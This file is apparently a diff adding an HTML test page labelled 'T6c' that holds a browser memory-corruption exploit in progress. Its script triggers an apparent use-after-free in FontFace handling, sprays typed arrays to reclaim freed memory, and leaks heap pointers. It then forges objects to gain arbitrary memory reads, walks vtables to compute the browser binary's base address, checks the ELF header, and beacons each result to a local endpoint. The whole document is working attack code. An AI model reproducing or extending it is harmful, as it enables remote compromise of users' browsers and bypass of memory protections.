@@ -1,0 +1,227 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>T6c</title></head>
+<body><pre id="O">T6c</pre>
+<script>
+'use strict';
+function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T6c-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
+bs('BOOT');
+var K=512,SZ=192,fired=false,faces=null,AT=0;
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function hex(x){return '0x'+x.toString(16);}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
+
+function start(){
+  AT++;if(AT>1)return;
+  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SZ));
+      put32(w,0,0x80000000);put32(w,4,0x1000+k);
+      w[0x82]=3;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,80);},function(){});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58);
+    if(a>0x1000000000n){
+      var b2=le(window.__sp[i],0x68);
+      if(L1===0n){L1=a;L2=b2;}
+      bufs.push([window.__sp[i],b2,i]);
+    }
+  }
+  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
+  if(!bufs.length){bs('NOLEAK');return;}
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);put64(vb,0x10,0n);vb[0x82]=0;
+  }
+  setTimeout(function(){
+    bs('FACES='+faces.length);
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+    for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=0;bufs[is2][0][0x2C]=0;}
+    setTimeout(function(){
+      // Check() results for EACH face — which is the oracle?
+      var chkResults='';
+      for(var q=0;q<faces.length;q++){
+        var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
+        chkResults+='zz'+q+'='+r+' ';
+      }
+      bs('CHK='+chkResults.trim());
+
+      var fam=null,zi=-1;
+      for(var q2=0;q2<faces.length;q2++){
+        var r2=null;try{r2=document.fonts.check('1em zz'+q2,'A');}catch(e){r2='EX';}
+        if(r2===false&&zi<0){fam='zz'+q2;zi=q2;}
+      }
+      bs('FAM='+fam+'-zi='+zi);
+      if(!fam){bs('NOTIN');return;}
+      var h0=bufs[0][0];
+
+      h0[0x82]=0;put64(h0,0x20,L1);
+      put32(h0,0x28,1);put32(h0,0x2C,1);
+      put32(h0,0x38,0xBEEF);put32(h0,0x3C,0xBF00);
+
+      function setR(addr){put64(h0,0x20,addr);}
+      function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'EX';}}
+
+      // SELF scan
+      bs('SCAN1');
+      var self=0n;
+      for(var sc=0x1000800000n;sc<0x1002800000n&&!self;sc+=0x80n){
+        setR(sc+0x38n);
+        if(chk(0xBEEF)!==true)continue;
+        if(chk(0xBEEE)!==false)continue;
+        setR(sc+0x6Cn);
+        if(chk(0)===false){self=sc;bs('SELF='+hex(sc));}
+      }
+      if(!self){bs('NOSELF');return;}
+
+      // ============================================================
+      // T6c DIAGNOSTIC: test which face returns binary after forge
+      // Hypothesis: JS-created FontFace (zi=0) caches "normal" in
+      // wrapper; CSS @font-face FontFace (zi=1) delegates to CSSFontFace.
+      // ============================================================
+      bs('DIAG-START');
+
+      // Baselines BEFORE forge (after delete)
+      for(var d0=0;d0<faces.length;d0++){
+        var bv='';try{bv=String(faces[d0].style);}catch(e){bv='THROW';}
+        bs('BASE'+d0+'='+bv);
+      }
+
+      // Delete ALL faces from document.fonts before forging
+      for(var d1=0;d1<faces.length;d1++){
+        try{document.fonts.delete(faces[d1]);}catch(e){}
+      }
+      bs('DEL-ALL');
+
+      var snap=new Uint8Array(SZ);
+      for(var s0=0;s0<SZ;s0++)snap[s0]=h0[s0];
+
+      function dec(s,lim){
+        var by=[],q3=(s.charAt(0)==='"')?1:0,e2=(s.slice(-1)==='"')?s.length-1:s.length,k2=q3;
+        while(k2<e2&&by.length<lim){var ch=s.charAt(k2);
+          if(ch==='\\'){k2++;var hh='';while(k2<e2&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k2))){hh+=s.charAt(k2);k2++;}
+            if(hh.length===0){if(k2<e2){by.push(s.charCodeAt(k2));k2++;}}
+            else{if(s.charAt(k2)===' ')k2++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+          else{by.push(s.charCodeAt(k2));k2++;}}
+        var hx='';for(var j=0;j<by.length;j++)hx+=('0'+by[j].toString(16)).slice(-2);return hx;
+      }
+
+      function forgeRead(daddr,dlen){
+        for(var fi=0;fi<window.__sp.length;fi++){
+          var fv=window.__sp[fi];if(!fv)continue;
+          put64(fv,0x08,self+0x70n);fv[0x10]=0;
+          put32(fv,0x30,4);put32(fv,0x34,dlen);
+          put64(fv,0x38,daddr);put32(fv,0x40,4);
+          fv[0x44]=0x7A;fv[0x45]=0x7A;fv[0x46]=0x71;
+          put32(fv,0x70,4);put32(fv,0x74,0x10);
+          fv[0x78]=14;fv[0x79]=0;
+          put64(fv,0x7A,self+0x90n);
+          put32(fv,0x90,3);put32(fv,0x94,72);
+          put64(fv,0x98,self+0x30n);
+        }
+      }
+      function readLeHex(hs,off){
+        var sl=hs.slice(off*2,off*2+16);
+        if(!/^[0-9a-f]{16}$/.test(sl))return 0n;
+        return BigInt('0x'+sl.match(/../g).reverse().join(''));
+      }
+      function restore(){
+        for(var ri=0;ri<window.__sp.length;ri++){
+          var rv=window.__sp[ri];if(!rv)continue;
+          for(var d=0;d<SZ;d++)rv[d]=snap[d];
+        }
+      }
+
+      // FORGE targeting L1-0x10 (hash table buckets)
+      forgeRead(L1-0x10n,80);
+
+      // Read ALL faces after forge
+      var winner=-1;
+      for(var d2=0;d2<faces.length;d2++){
+        var rv='';
+        try{rv=dec(String(faces[d2].style),128);}catch(e){rv='THROW';}
+        bs('HEX'+d2+'-len='+rv.length+'-d='+rv.slice(0,60));
+        if(rv!=='THROW'&&rv.length>20&&winner<0) winner=d2;
+      }
+      bs('WINNER='+winner);
+
+      // If a winner exists, do the full walk chain with that face
+      var IM=0n,FO=0n,VP=0n;
+      if(winner>=0){
+        var hw='';
+        try{hw=dec(String(faces[winner].style),128);}catch(e){hw='THROW';}
+        if(hw!=='THROW'&&hw.length>=80){
+          for(var gb=2;gb<10;gb++){
+            var cv=readLeHex(hw,gb*8);
+            if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn){IM=cv;break;}
+          }
+        }
+        if(IM!==0n){
+          restore();forgeRead(IM+8n,16);
+          var h2='';try{h2=dec(String(faces[winner].style),128);}catch(e){h2='THROW';}
+          bs('W1-d='+h2.slice(0,32));
+          if(h2!=='THROW'&&h2.length>=16) FO=readLeHex(h2,0);
+        }
+        if(FO>0x1000000000n){
+          restore();forgeRead(FO,32);
+          var h3='';try{h3=dec(String(faces[winner].style),128);}catch(e){h3='THROW';}
+          bs('W2-d='+h3.slice(0,64));
+          if(h3!=='THROW'&&h3.length>=16) VP=readLeHex(h3,0);
+        }
+        if(VP>0x100000000n){
+          restore();forgeRead(VP,128);
+          var h4='';try{h4=dec(String(faces[winner].style),128);}catch(e){h4='THROW';}
+          var walkOK=(h4!=='THROW'&&h4.length>=128);
+          if(walkOK){
+            bs('VT-d='+h4.slice(0,144));
+            var BASE=VP-0xC6A1B28n;
+            bs('BASE='+hex(BASE));
+            for(var si=0;si<8;si++){
+              var sv=readLeHex(h4,si*8);
+              bs('VT-s'+si+'='+hex(sv));
+            }
+            // ELF check
+            restore();forgeRead(BASE,32);
+            var elfH='';try{elfH=dec(String(faces[winner].style),128);}catch(e){elfH='THROW';}
+            if(elfH.length>=16){
+              bs('ELF-d='+elfH.slice(0,32));
+              bs('ELF-MAGIC='+((elfH.slice(0,16)==='7f454c4602010100')?'YES':'NO'));
+            }
+          }
+          bs('WALK-ok='+walkOK+'-VP='+hex(VP));
+        }
+      }
+
+      restore();
+      bs('WALK-IM='+hex(IM)+',FO='+hex(FO)+',VP='+hex(VP));
+      var tb=(VP>0x100000000n)?VP-0xC6A1B28n:0x800000000n;
+      bs('TB='+hex(tb));
+      bs('DONE-winner='+winner+'-VP='+hex(VP));
+      document.getElementById('O').textContent=
+        'T6c '+(VP>0x100000000n?'WALK-OK VP='+hex(VP)+' winner='+winner:'DIAG winner='+winner);
+    },500);
+  },80);
+}
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
